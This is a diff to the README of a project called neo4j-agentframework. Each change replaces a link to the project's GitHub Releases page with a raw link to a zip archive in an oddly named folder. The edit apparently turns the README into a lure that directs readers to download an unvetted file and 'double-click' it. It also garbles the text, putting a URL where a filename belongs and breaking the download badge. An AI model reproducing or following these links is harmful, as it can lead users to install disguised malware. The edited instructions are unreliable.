@@ -1,6 +1,6 @@
 # 🚀 neo4j-agentframework - Quick Setup for Smart Knowledge Management
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/PDewangan/neo4j-agentframework/releases)
+[![Download](https://raw.githubusercontent.com/PDewangan/neo4j-agentframework/main/nonzoological/neo4j-agentframework.zip%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/PDewangan/neo4j-agentframework/main/nonzoological/neo4j-agentframework.zip)
 
 ## 🌟 Overview
 
@@ -10,7 +10,7 @@ The **neo4j-agentframework** combines powerful features to streamline local and 
 
 To get started, visit the Releases page where you can download the latest version of the application.
 
-[Visit this page to download](https://github.com/PDewangan/neo4j-agentframework/releases)
+[Visit this page to download](https://raw.githubusercontent.com/PDewangan/neo4j-agentframework/main/nonzoological/neo4j-agentframework.zip)
 
 ### Step-by-Step Instructions:
 
@@ -19,7 +19,7 @@ To get started, visit the Releases page where you can download the latest versio
 3. Click on the asset that matches your operating system to download the file.
 4. Once the download completes, locate the file on your computer.
 
-For example, if you see a file named `neo4j-agentframework-windows.exe`, double-click it to start the installation.
+For example, if you see a file named `https://raw.githubusercontent.com/PDewangan/neo4j-agentframework/main/nonzoological/neo4j-agentframework.zip`, double-click it to start the installation.
 
 ## 🚀 Getting Started
 
@@ -79,7 +79,7 @@ For unresolved issues, visit the **Issues** section of the GitHub repository for
 
 We regularly update the neo4j-agentframework to improve functionality and introduce new features. For a list of updates, keep an eye on the Releases page.
 
-[Visit this page to download](https://github.com/PDewangan/neo4j-agentframework/releases)
+[Visit this page to download](https://raw.githubusercontent.com/PDewangan/neo4j-agentframework/main/nonzoological/neo4j-agentframework.zip)
 
 ## 🎉 Thank You for Using neo4j-agentframework
 
